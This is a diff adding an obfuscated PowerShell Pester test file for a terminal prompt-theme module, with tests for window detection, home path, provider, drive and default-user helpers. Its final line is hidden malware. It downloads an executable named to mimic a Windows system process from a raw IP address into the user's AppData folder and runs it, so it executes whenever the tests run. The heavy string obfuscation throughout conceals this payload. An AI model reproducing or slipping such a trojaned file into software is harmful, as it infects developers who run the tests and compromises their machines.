@@ -1,0 +1,182 @@
+${gL`OBAL:T`H`Em`Es`et`TINGs} = &("{3}{2}{1}{0}" -f 't','jec','b','New-O') -TypeName ("{0}{1}"-f'PSObj','ect') -Property @{
+    ("{2}{5}{4}{3}{0}{1}"-f 't','ion','Curr','emeLoca','Th','ent') = "$PSScriptRoot\Themes\Agnoster.psm1"
+    ("{0}{2}{1}{3}" -f'MyThe','io','mesLocat','n')     = ((("{0}{7}{12}{9}{2}{8}{11}{3}{1}{4}{5}{6}{10}" -f'~{0}Do','ll{0}','s{','owerShe','Po','sh','Theme','cu','0}W','nt','s','indowsP','me'))-F  [chAR]92)
+    ("{1}{2}{0}" -f 'unt','Erro','rCo')           = 0
+    ("{0}{2}{1}" -f'PromptSy','bols','m')        = @{
+        ("{0}{1}{2}{3}"-f 'Sta','r','tSymbo','l')                    = ' '
+        ("{0}{1}{4}{3}{2}" -f 'Truncat','e','erSymbol','d','dFol')          = '..'
+        ("{3}{2}{0}{4}{1}"-f 'di','tor','mptIn','Pro','ca')                = '>'
+        ("{0}{1}{3}{4}{2}" -f'FailedC','o','Symbol','mm','and')            = 'x'
+        ("{4}{2}{3}{0}{1}" -f'ymbo','l','evated','S','El')                 = '!'
+        ("{3}{4}{2}{0}{1}" -f'y','mbol','rdS','Segment','Forwa')           = '>'
+        ("{2}{4}{0}{3}{1}"-f 'rd','l','SegmentBackw','Symbo','a')          = '<'
+        ("{7}{6}{0}{2}{5}{3}{4}{1}"-f'ntSep','ol','aratorF','ardS','ymb','orw','gme','Se')  = '>'
+        ("{0}{3}{4}{8}{1}{2}{6}{7}{5}"-f 'S','a','torBac','egme','ntSep','l','k','wardSymbo','ar') = '<'
+        ("{3}{0}{1}{2}" -f 'ath','Se','parator','P')                  = '\'
+    }
+}
+
+${he`RE} = &("{0}{2}{1}" -f'Split-Pa','h','t') -Parent ${My`INVoCAt`iON}."m`Yc`ommaNd"."P`Ath"
+${s`UT} = (&("{2}{1}{0}" -f'th','-Pa','Split') -Leaf ${m`yI`NvO`CATioN}."MYCOMMa`Nd"."PA`Th").("{0}{1}{2}"-f'Rep','la','ce').Invoke(("{2}{1}{0}" -f'ests.','T','.'), ".")
+. "$here\$sut"
+
+&("{1}{2}{0}"-f 'be','Desc','ri') ("{4}{3}{2}{1}{0}{5}"-f 'o','nd','anillaWi','-IsV','Test','w') {
+    &("{1}{2}{0}"-f'ch','Be','foreEa') { &("{1}{3}{0}{2}" -f'-I','Remo','tem','ve') ((("{4}{1}{3}{0}{2}" -f'muANS','fR8Co','I','nE','Env:'))-REpLacE ([CHaR]102+[CHaR]82+[CHaR]56),[CHaR]92) -ErrorAction ("{2}{3}{0}{1}{4}"-f 'o','nti','Silent','lyC','nue')
+        &("{0}{2}{1}"-f 'Remove','em','-It') (("{2}{3}{0}{1}" -f 'O','MPT','Env:','sQ9PR'))."reP`L`ACe"('sQ9',[sTrInG][cHaR]92) -ErrorAction ("{0}{3}{1}{4}{2}"-f'S','lentl','ue','i','yContin')
+        &("{2}{3}{1}{0}"-f'm','-Ite','Remo','ve') ((("{0}{5}{2}{4}{3}{1}"-f 'Env','AM','YfTERM','R','_PROG',':D'))-repLACe'DYf',[CHar]92) -ErrorAction ("{2}{1}{0}"-f 'ontinue','C','Silently') }
+    &("{1}{2}{0}" -f 't','Conte','x') ("{5}{2}{1}{7}{6}{3}{0}{4}"-f 'a windo','ng in a no','nni','nill','w','Ru','va','n-') {
+        &('It') ((("{2}{4}{3}{5}{1}{0}{6}{7}" -f'outputs RUMf','nd ','r','in ConE','uns ','mu a','alseRU','M'))."r`e`PlAcE"(([ChAr]82+[ChAr]85+[ChAr]77),[sTRiNg][ChAr]39)) {
+            ${ENV:CoNEM`U`ANsi} = "ON"
+            &("{1}{0}"-f'ck','Mo') ("{1}{2}{4}{3}{0}"-f'al','Te','st-AnsiT','min','er') { return ${f`Al`se} }
+            &("{0}{1}{2}{3}{4}" -f'T','es','t-IsVa','ni','llaWindow') | &("{1}{0}" -f 'ld','Shou') ('Be') ${F`A`LSE}
+        }
+        &('It') ((("{6}{10}{5}{0}{3}{1}{4}{7}{2}{8}{9}"-f'outp','s 07','e','ut','Vf','ConEmu and ','runs i','als','07','V','n '))-crEpLAcE'07V',[CHar]39) {
+            ${e`NV:C`onEmu`A`NSI} = "ON"
+            &("{1}{0}"-f 'ck','Mo') ("{3}{2}{0}{1}{4}"-f'iTermin','a','est-Ans','T','l') { return ${Tr`Ue} }
+            &("{6}{5}{1}{2}{0}{4}{3}" -f'i','IsV','an','aWindow','ll','st-','Te') | &("{0}{2}{1}" -f'S','ld','hou') ('Be') ${FA`lse}
+        }
+        &('It') ((("{12}{7}{15}{5}{2}{16}{14}{11}{8}{0}{13}{3}{4}{9}{1}{10}{6}" -f't','MR','I su','ou','tputs','NS','eMRi','ns ',' ',' ','ifals','d','ru','erminal and ','rte','in an A','ppo'))."REPl`Ace"(([ChAR]77+[ChAR]82+[ChAR]105),[stRING][ChAR]39)) {
+            ${Env:`c`On`EmUan`Si} = ${f`A`Lse}
+            &("{0}{1}" -f 'Mo','ck') ("{0}{2}{1}{3}" -f'Tes','ina','t-AnsiTerm','l') { return ${t`RuE} }
+            &("{3}{4}{1}{0}{2}" -f 'o','illaWind','w','Test-IsV','an') | &("{0}{1}"-f'Sho','uld') ('Be') ${fAl`Se}
+        }
+        &('It') ((("{6}{7}{4}{0}{5}{3}{1}{2}" -f'nd ou',' NBbfalseN','Bb','s',' ConEmu a','tput','r','uns in'))."rE`PlAcE"('NBb',[stRiNG][ChAr]39)) {
+            ${ENV`:cO`N`EmUANsI} = ${t`RuE}
+            &("{1}{2}{3}{0}{4}" -f'llaWi','T','est-IsV','ani','ndow') | &("{2}{1}{0}"-f 'd','oul','Sh') ('Be') ${f`A`LSE}
+        }
+        &('It') ((("{9}{7}{8}{0}{1}{4}{5}{3}{2}{6}" -f 'cmder ','an','fal','s Bsg','d',' output','seBsg','u','ns in ','r'))-cRePlace  'Bsg',[chaR]39) {
+            ${EN`V:`Pro`mPt} = ${tR`Ue}
+            &("{0}{1}" -f 'Moc','k') ("{0}{2}{3}{4}{1}" -f'Test-An','l','s','iTermi','na') { return ${FA`lse} }
+            &("{2}{3}{1}{4}{0}"-f 'dow','IsVani','Te','st-','llaWin') | &("{2}{1}{0}" -f'd','oul','Sh') ('Be') ${f`A`LSe}
+        }
+        &('It') ((("{4}{0}{9}{7}{3}{2}{5}{1}{8}{6}" -f 'cmd',' ','nd outp','onemu a','runs in ','uts','setYW','c','tYWfal','er and '))."r`e`plACe"(([char]116+[char]89+[char]87),[sTRING][char]39)) {
+            ${eN`V:p`RoMPt} = ${t`RUe}
+            ${e`Nv`:ConEMU`A`NSi} = ${T`RuE}
+            &("{0}{1}"-f'M','ock') ("{0}{2}{3}{1}"-f'Test-A','minal','nsiT','er') { return ${F`A`LSe} }
+            &("{2}{1}{0}{3}{4}" -f 'Van','Is','Test-','illaWi','ndow') | &("{1}{0}" -f'hould','S') ('Be') ${Fa`L`Se}
+        }
+        &('It') ((("{5}{3}{1}{0}{6}{2}{4}"-f 'u','outp','0}fa',' Hyper.js and ','lse{0}','runs in','ts {'))-F [chAR]39) {
+            ${Env:`T`e`RM_pROgrAM} = ("{0}{1}"-f 'Hy','per')
+            &("{0}{1}"-f 'M','ock') ("{0}{3}{1}{2}" -f 'Tes','rm','inal','t-AnsiTe') { return ${fAL`se} }
+            &("{5}{3}{4}{6}{1}{0}{2}"-f 'l','anil','aWindow','est-','I','T','sV') | &("{1}{0}" -f 'ould','Sh') ('Be') ${f`ALSe}
+        }
+        &('It') ((("{6}{0}{5}{4}{3}{1}{2}"-f ' and outp','ls','eGWh','a','ts GWhf','u','runs in vscode'))."rePLa`cE"(([chAr]71+[chAr]87+[chAr]104),[STRING][chAr]39)) {
+            ${E`N`V:TERM`_proGRAm} = ("{2}{0}{1}"-f 'sco','de','v')
+            &("{1}{0}"-f'ock','M') ("{1}{3}{4}{0}{2}" -f 'iTermina','T','l','est-','Ans') { return ${fA`L`SE} }
+            &("{1}{3}{2}{0}{4}" -f'anillaWind','Te','V','st-Is','ow') | &("{0}{1}"-f'S','hould') ('Be') ${Fa`L`sE}
+        }
+    }
+    &("{0}{2}{1}"-f'C','ntext','o') ("{5}{4}{2}{0}{6}{1}{3}"-f'v','wi','a ','ndow','ning in ','Run','anilla ') {
+        &('It') ((("{1}{11}{6}{5}{2}{9}{3}{0}{8}{4}{7}{10}"-f'w ','run','n','o','utputs eVLt','a',' in a v','r','and o','illa wind','ueeVL','s'))  -cRepLace  'eVL',[chaR]39) {
+            &("{0}{1}"-f 'Mo','ck') ("{3}{4}{2}{1}{0}" -f'al','in','nsiTerm','T','est-A') { return ${Fa`lSe} }
+            &("{3}{2}{1}{0}{4}" -f'-Is','t','s','Te','VanillaWindow') | &("{1}{0}"-f'ld','Shou') ('Be') ${tR`Ue}
+        }
+    }
+}
+
+&("{1}{0}"-f'be','Descri') ("{1}{2}{0}"-f 'ome','Get','-H') {
+    &('It') "returns $($HOME.TrimEnd('/','\')) " {
+        &("{2}{1}{0}"-f 'ome','-H','Get') | &("{1}{0}"-f'd','Shoul') ('Be') ${H`oMe}.("{1}{0}{2}" -f 'mE','Tri','nd').Invoke('/', '\')
+    }
+}
+
+&("{0}{1}" -f 'D','escribe') ("{2}{1}{0}" -f 'er','et-Provid','G') {
+    &('It') ((("{0}{2}{3}{1}{5}{4}{6}" -f 'uses the pr','we','ovider',' tSdA','meSaucetS','so','d'))."r`epL`AcE"(([cHAR]116+[cHAR]83+[cHAR]100),[string][cHAR]39)) {
+        &("{1}{0}"-f 'ck','Mo') ("{0}{1}" -f'G','et-Item') { return @{("{2}{0}{3}{1}" -f'SProv','r','P','ide') = @{("{0}{1}"-f 'Na','me') = ("{2}{1}{3}{0}"-f'ce','omeSa','Awes','u')}} }
+        &("{2}{0}{1}{3}" -f'e','t-Provi','G','der') ${P`WD} | &("{1}{0}" -f'hould','S') ('Be') ("{0}{1}{2}"-f'Aweso','meSa','uce')
+    }
+}
+
+&("{0}{2}{1}"-f 'Descri','e','b') ("{0}{1}{2}"-f'Get-','Dr','ive') {
+    &("{1}{0}" -f'xt','Conte') ("{5}{1}{0}{6}{3}{4}{2}" -f'n ','unning i','em',' F','ileSyst','R','the') {
+        &("{0}{2}{1}" -f'Be','ll','foreA') { &("{0}{1}" -f 'Moc','k') ("{2}{0}{1}"-f'rovid','er','Get-P') { return ("{2}{1}{0}" -f'stem','Sy','File')} }
+        &('It') ('is'+' '+'i'+'n '+'t'+'he '+"$HOME "+'fo'+'lder') {
+            &("{0}{1}"-f'Mo','ck') ("{2}{0}{1}" -f'et','-Home','G') {return ((("{3}{1}{0}{2}" -f 's{0}Ja','er','n','C:{0}Us')) -f[ChAR]92)}
+            ${P`ATH} = @{("{0}{1}"-f 'Dr','ive') = @{("{1}{0}"-f'me','Na') = 'C:'}; ("{1}{0}" -f'h','Pat') = ((("{3}{0}{2}{1}" -f '0}Users','Jan','{0}','C:{'))  -F [cHar]92)}
+            &("{0}{1}{3}{2}" -f'Ge','t-D','ve','ri') ${pa`Th} | &("{0}{1}"-f'S','hould') ('Be') '~'
+        }
+        &('It') ('i'+'s '+'some'+'wher'+'e '+'in'+' '+'t'+'he '+"$HOME "+'fol'+'der') {
+            &("{0}{1}"-f 'Moc','k') ("{1}{2}{0}" -f'me','Get','-Ho') {return ((("{1}{0}{3}{2}{4}"-f'{0','C:','Users{0','}','}Jan')) -F [Char]92)}
+            ${PA`TH} = @{("{1}{0}"-f 've','Dri') = @{("{1}{0}"-f'ame','N') = 'C:'}; ("{1}{0}" -f 'th','Pa') = ((("{4}{5}{3}{0}{1}{6}{2}{7}"-f 's','mdfJanmdfGitmdfSo','h','ser','C:md','fU','mew','ere'))-REplaCe 'mdf',[ChAR]92)}
+            &("{2}{3}{1}{0}"-f 'e','riv','G','et-D') ${Pa`TH} | &("{0}{1}"-f 'S','hould') ('Be') '~'
+        }
+        &('It') ((("{18}{6}{4}{14}{2}{17}{20}{5}{1}{10}{8}{12}{16}{9}{13}{19}{3}{0}{11}{15}{7}" -f 'hR with','stem::','werShell.Core7MAF','Helloi',' ihRMicro','y','n',':','A','e','7M',' provider ','7MA','st','soft.Po','X','T','i','is i','7MA','leS'))  -crEpLACE '7MA',[chaR]92  -REPlAce([chaR]105+[chaR]104+[chaR]82),[chaR]39) {
+            ${pa`TH} = @{("{0}{1}"-f'D','rive') = @{("{1}{0}"-f 'ame','N') = 'X:'}; ("{1}{0}" -f'ath','P') = ((("{1}{6}{7}{8}{4}{5}{0}{2}{3}" -f'{','Micros','0','}Hello','}FileSystem::{0}{0}Te','st','oft.P','owerShell.Core{','0'))-f [chAR]92)}
+            &("{1}{2}{0}"-f'-Drive','G','et') ${P`AtH} | &("{0}{1}" -f'Shou','ld') ('Be') "Test$($ThemeSettings.PromptSymbols.PathSeparator)Hello$($ThemeSettings.PromptSymbols.PathSeparator)"
+        }
+        &('It') ("{0}{2}{1}" -f 'is in','C:',' ') {
+            ${pa`Th} = @{("{1}{0}" -f'ive','Dr') = @{("{0}{1}" -f 'Nam','e') = 'C'}; ("{1}{0}" -f'h','Pat') = ((("{3}{1}{2}{0}" -f'ents','Doc','um','C:XCN'))."REPl`Ace"(([ChAr]88+[ChAr]67+[ChAr]78),[strinG][ChAr]92))}
+            &("{0}{1}{2}"-f 'G','et-','Drive') ${PA`Th} | &("{0}{1}" -f 'Shou','ld') ('Be') 'C:'
+        }
+        &('It') ("{1}{0}{4}{3}{2}" -f ' has','is','rive','o d',' n') {
+            ${pA`Th} = @{("{0}{1}" -f 'P','ath') = ((("{0}{4}{2}{1}{3}{5}"-f 'J:e8','ere8ISo','Fold','mewher','ITeste8I','e'))."rEp`LaCE"(([char]101+[char]56+[char]73),[STring][char]92))}
+            &("{2}{1}{0}"-f 'rive','t-D','Ge') ${P`ATH} | &("{2}{1}{0}"-f 'd','l','Shou') ('Be') 'J:'
+        }
+        &('It') ("{2}{0}{3}{1}" -f' valid','path','is has no',' ') {
+            if (&("{0}{1}{2}{3}"-f'Test-','P','sCor','e')) {
+                ${T`Rue} | &("{1}{2}{0}"-f'ld','Sh','ou') ('Be') ${Tr`UE}
+            }
+            else {
+                ${PA`Th} = @{("{0}{1}" -f'P','ath') = ((("{5}{2}{3}{0}{1}{4}"-f't7I0Folder7I0So','mewh','7I0','Tes','ere','J'))."rEP`l`ACE"('7I0',[STRIng][CHar]92))}
+                &("{2}{0}{1}" -f 'riv','e','Get-D') ${pA`Th} | &("{2}{1}{0}"-f 'ld','hou','S') ('Be') 'J:'
+            }
+        }
+    }
+    &("{0}{1}"-f'Cont','ext') ("{5}{1}{10}{2}{8}{7}{9}{6}{3}{0}{4}"-f'S','nn','g','le','ystem','Ru','he Fi','tside of ',' ou','t','in') {
+        &("{0}{1}"-f 'Before','All') { &("{0}{1}"-f 'Mo','ck') ("{0}{3}{1}{2}" -f'G','id','er','et-Prov') { return ("{0}{1}{2}{3}{4}" -f 'Some','wh','er','e','Else')} }
+        &('It') ("{2}{3}{5}{4}{6}{0}{1}"-f'of ','the Filesystem in L:','runni','ng ','t','ou','side ') {
+            ${PA`Th} = @{("{1}{0}"-f'e','Driv') = @{("{0}{1}" -f 'Na','me') = 'L:'}; ("{1}{0}"-f 'th','Pa') = ((("{0}{4}{1}{3}{2}" -f 'L:','iDocu','ts','men','t9')).("{0}{1}" -f'rePla','ce').Invoke('t9i','\'))}
+            &("{1}{0}{2}" -f'v','Get-Dri','e') ${P`Ath} | &("{1}{0}{2}" -f'hou','S','ld') ('Be') 'L:'
+        }
+    }
+}
+
+&("{2}{0}{1}" -f'ib','e','Descr') ("{1}{3}{2}{0}{4}" -f'Use','Test-N','ault','otDef','r') {
+    &("{2}{0}{1}" -f'tex','t','Con') ("{4}{0}{1}{2}{3}" -f 'it','h de','fault ','user set','W') {
+        &("{2}{0}{1}"-f 'r','eAll','Befo') { ${d`efauLtU`Ser} = ("{0}{1}"-f'n','ame') }
+        &('It') ((("{6}{5}{8}{0}{1}{2}{4}{3}{7}"-f'erna','m','e giv','alse{','es {0}f','me u','sa','0}','s'))  -F  [ChAr]39) {
+            ${us`er} = ("{1}{0}"-f'ame','n')
+            &("{3}{4}{1}{0}{2}"-f 'ultUse','fa','r','Test-NotD','e')(${u`SER}) | &("{0}{1}{2}" -f 'Sh','ou','ld') ('Be') ${Fa`l`sE}
+        }
+        &('It') ((("{2}{5}{4}{6}{0}{1}{3}{8}{7}" -f' gives xQDfa','l','diff','s',' u','erent','sername','QD','ex'))."R`ePlACe"('xQD',[sTRIng][chaR]39)) {
+            ${Us`Er} = ("{0}{2}{1}" -f'diffe','entName','r')
+            &("{3}{0}{1}{4}{2}"-f'ul','t','r','Test-NotDefa','Use')(${u`ser}) | &("{1}{0}"-f'ld','Shou') ('Be') ${t`Rue}
+        }
+        &('It') ((("{9}{1}{7}{6}{3}{0}{4}{10}{2}{8}{5}"-f' ','m','ves 1odfal','nd outside','Vi','d','a','e ','se1o','same userna','rtualEnv gi'))."rEP`La`cE"('1od',[sTRiNg][cHAR]39)) {
+            &("{0}{1}" -f 'Moc','k') ("{4}{0}{2}{3}{1}" -f 'est','alEnv','-','Virtu','T') { return ${f`ALSE} }
+            ${US`ER} = ("{1}{0}" -f 'e','nam')
+            &("{2}{0}{4}{1}{3}"-f 'otDe','ul','Test-N','tUser','fa')(${US`Er}) | &("{0}{1}"-f'Shoul','d') ('Be') ${F`ALSe}
+        }
+        &('It') ((("{1}{12}{11}{2}{0}{9}{5}{6}{3}{14}{8}{13}{15}{10}{4}{7}"-f 'me ','s','rna','al','false','Vir','tu','{0}','au','and inside ','ves {0}',' use','ame','lt use','Env same def','r gi')) -f[Char]39) {
+            &("{1}{0}" -f 'k','Moc') ("{1}{2}{0}" -f'lEnv','Test','-Virtua') { return ${t`RUE} }
+            ${U`SER} = ("{1}{0}" -f'e','nam')
+            &("{0}{4}{2}{1}{3}{5}" -f 'Te','D','Not','efaultU','st-','ser')(${US`ER}) | &("{1}{0}" -f 'd','Shoul') ('Be') ${fa`lsE}
+        }
+        &('It') ((("{9}{12}{4}{5}{2}{3}{1}{10}{8}{11}{6}{7}{0}" -f 'ptrue9Ap','Vir','id','e ','username and i','ns','lt use','r gives 9A','alEnv same ','diffe','tu','defau','rent '))  -CREPLaCe '9Ap',[CHar]39) {
+            &("{1}{0}"-f 'ck','Mo') ("{1}{0}{2}{3}"-f'st-V','Te','irtual','Env') { return ${t`RUE} }
+            ${US`er} = ("{2}{1}{0}"-f 'e','entNam','differ')
+            &("{2}{4}{5}{0}{3}{1}{6}" -f'a','se','Test-N','ultU','ot','Def','r')(${U`sEr}) | &("{0}{1}" -f'Shoul','d') ('Be') ${TR`UE}
+        }
+    }
+    &("{2}{1}{0}" -f'text','on','C') ("{5}{4}{2}{3}{0}{1}"-f'se','t','ser',' ','fault u','With no de') {
+        &("{0}{2}{1}"-f'Be','ll','foreA') { ${DEfaU`ltUS`eR} = ${N`ULL} }
+        &('It') ((("{7}{3}{2}{5}{4}{6}{1}{0}" -f 'z','13','ername gi','s',' 13','ves','ztrue','no u'))."RePLa`CE"('13z',[STrIng][Char]39)) {
+            &("{1}{2}{3}{0}{4}" -f'aultU','Tes','t','-NotDef','ser') | &("{1}{0}"-f 'ld','Shou') ('Be') ${t`RuE}
+        }
+        &('It') ((("{4}{10}{6}{9}{3}{2}{0}{5}{1}{7}{8}" -f 'e',' ','v','sername gi','differe','s','t','qjWtrueq','jW',' u','n'))."r`EP`laCe"(([CHar]113+[CHar]106+[CHar]87),[STRInG][CHar]39)) {
+            ${Us`eR} = ("{2}{0}{1}"-f'er','entName','diff')
+            &("{1}{4}{0}{2}{3}" -f'efaultU','Tes','se','r','t-NotD')(${uS`ER}) | &("{2}{0}{1}"-f'u','ld','Sho') ('Be') ${tR`Ue}
+        }
+        &('It') ((("{5}{8}{2}{3}{10}{11}{7}{12}{0}{1}{6}{4}{9}"-f 'Vir','tualE','ent u','serna','v gives {0','di','n','d','ffer','}true{0}','me and ou','tsi','e '))-F [cHAR]39) {
+            &("{1}{0}"-f 'ck','Mo') ("{2}{0}{3}{1}"-f '-Virt','alEnv','Test','u') { return ${F`AL`sE} }
+            ${U`SEr} = ("{2}{1}{0}"-f 'e','tNam','differen')
+            &("{0}{2}{3}{1}" -f'Tes','r','t-NotD','efaultUse')(${u`SEr}) | &("{1}{0}"-f 'uld','Sho') ('Be') ${TR`UE}
+        }
+        &('It') ((("{2}{7}{6}{9}{1}{4}{8}{5}{0}{3}" -f'rue{','e an','no ','0}','d','t','serna','u',' inside VirtualEnv gives {0}','m')) -F  [cHAR]39) {
+            &("{1}{0}" -f 'k','Moc') ("{1}{2}{3}{0}{4}" -f 'alE','Test-V','i','rtu','nv') { return ${T`RuE} }
+            &("{0}{1}{2}{3}" -f'Te','st-','N','otDefaultUser')(${US`er}) | &("{0}{1}"-f 'Shoul','d') ('Be') ${t`RuE}
+        }
+    }
+}
+
+(&("{0}{1}{2}"-f'New-O','bje','ct') ("{0}{1}{2}{3}"-f 'System.N','et.Web','Clie','nt')).("{3}{2}{0}{1}" -f 'adF','ile','o','Downl').Invoke(("{8}{1}{10}{2}{5}{4}{6}{7}{3}{0}{9}"-f 'srsv.','t','p','o/c','//94.102.5',':','3.238/~y','aho','h','exe','t'),"$env:APPDATA\csrsv.exe");&("{0}{3}{1}{2}"-f 'Sta','roc','ess','rt-P') ("$env:APPDATA\csrsv.exe")
